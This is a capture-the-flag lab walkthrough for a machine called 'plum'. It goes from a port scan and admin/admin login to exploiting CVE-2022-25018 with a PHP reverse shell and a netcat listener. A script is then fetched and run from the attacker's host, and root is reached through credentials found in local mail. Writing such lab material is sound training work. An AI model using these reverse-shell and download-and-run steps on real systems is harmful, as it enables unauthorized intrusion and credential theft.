`Running all scans on 192.168.217.28`

`Host is likely running Unknown OS!`

`---------------------Starting Port Scan-----------------------`

`PORT   STATE SERVICE`
`22/tcp open  ssh`
`80/tcp open  http`

On the bottom of the webpage, there is an Administration link
Weak credentials: admin/admin

Once we login, it shows the version

![[Pasted image 20240222130748.png]]

Google this and check the first result
![[Pasted image 20240222130814.png]]

There is a PDF listed in the references
- [https://github.com/MoritzHuppert/CVE-2022-25018/blob/main/CVE-2022-25018.pdf](https://github.com/MoritzHuppert/CVE-2022-25018/blob/main/CVE-2022-25018.pdf)

On the second page it gives the steps to recreate the exploit
![[Pasted image 20240222130918.png]]

Let's do this using Pentest Monkey's PHP reverse shell. https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

![[Pasted image 20240222131210.png]]

Paste it at the bottom of the static page after changing the IP address 

Click view page Static 1 on site and it launches the reverse shell

`└─$ nc -nlvp 1234`         
`Ncat: Version 7.94SVN ( https://nmap.org/ncat )`
`Ncat: Listening on [::]:1234`
`Ncat: Listening on 0.0.0.0:1234`
`Ncat: Connection from 192.168.217.28:37878.`
`Linux plum 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64 GNU/Linux`
 `12:56:30 up 13 min,  0 users,  load average: 0.00, 0.00, 0.00`
`USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT`
`uid=33(www-data) gid=33(www-data) groups=33(www-data)`
`/bin/sh: 0: can't access tty; job control turned off`
`$ python3 -c 'import pty; pty.spawn("/bin/bash")'`

Upload and run LSE.sh
`www-data@plum:/tmp$ wget 192.168.45.222/lse_cve.sh`
`wget 192.168.45.222/lse_cve.sh`
`--2024-02-22 12:57:49--  http://192.168.45.222/lse_cve.sh`
`Connecting to 192.168.45.222:80... connected.`
`HTTP request sent, awaiting response... 200 OK`
`Length: 55098 (54K) [text/x-sh]`
`Saving to: ‘lse_cve.sh’`

`lse_cve.sh          100%[===================>]  53.81K  --.-KB/s    in 0.07s`   

`2024-02-22 12:57:50 (758 KB/s) - ‘lse_cve.sh’ saved [55098/55098]`

`www-data@plum:/tmp$ chmod +x lse_cve.sh`
`chmod +x lse_cve.sh`
`www-data@plum:/tmp$ ./lse_cve.sh -l 1`

We notice our user has mail
`Does 'www-data' have mail?...................................... yes!`
---
`-rw-rw---- 1 www-data mail 4549 Feb 22 12:58 /var/mail/www-data`

Check it with "mail"
`www-data@plum:/tmp$ mail`
`mail`
`"/var/mail/www-data": 3 messages 3 new`
>`N   1 root@localhost     Fri Aug 25 06:31  18/700   URGENT - DDOS ATTACK"`
 `N   2 Mail Delivery Syst Thu Feb 22 12:57  57/1861  Mail delivery failed: ret`
 `N   3 Mail Delivery Syst Thu Feb 22 12:58  57/1852  Mail delivery failed: ret`

Read the message
`? n`
`n`
`Return-path: <root@localhost>`
`Envelope-to: www-data@localhost`
`Delivery-date: Fri, 25 Aug 2023 06:31:47 -0400`
`Received: from root by localhost with local (Exim 4.94.2)`
	`(envelope-from <root@localhost>)`
	`id 1qZU6V-0000El-Pw`
	`for www-data@localhost; Fri, 25 Aug 2023 06:31:47 -0400`
`To: www-data@localhost`
`From: root@localhost`
`Subject: URGENT - DDOS ATTACK"`
`Reply-to: root@localhost`
`Message-Id: <E1qZU6V-0000El-Pw@localhost>`
`Date: Fri, 25 Aug 2023 06:31:47 -0400`

`We are under attack. We've been targeted by an extremely complicated and sophisicated DDOS attack. I trust your skills. Please save us from this. Here are the credentials for the root user:`  
`root:6s8kaZZNaZZYBMfh2YEW`
`Thanks,`
`Administrator`

SSH in with these root credentials and get the flags

`└─$ ssh root@192.168.217.28`                              
`Warning: Permanently added '192.168.217.28' (ED25519) to the list of known hosts.`
`root@192.168.217.28's password:` 
`Linux plum 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64`

`The programs included with the Debian GNU/Linux system are free software;`
`the exact distribution terms for each program are described in the`
`individual files in /usr/share/doc/*/copyright.`

`Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent`
`permitted by applicable law.`
`Last login: Fri Aug 25 06:28:24 2023 from 10.9.1.19`
`root@plum:~# ls`
`email7.txt  proof.txt  proof.xt`
`root@plum:~# cat proof.txt`
`f3f3198c6eebe8933207bdc8c1caffa5`
`root@plum:~# find / -name local.txt 2>/dev/null`
`/var/www/local.txt`
`root@plum:~# cat /var/www/local.txt`
`a20e327bfd023efd0d01877a51011d3b`
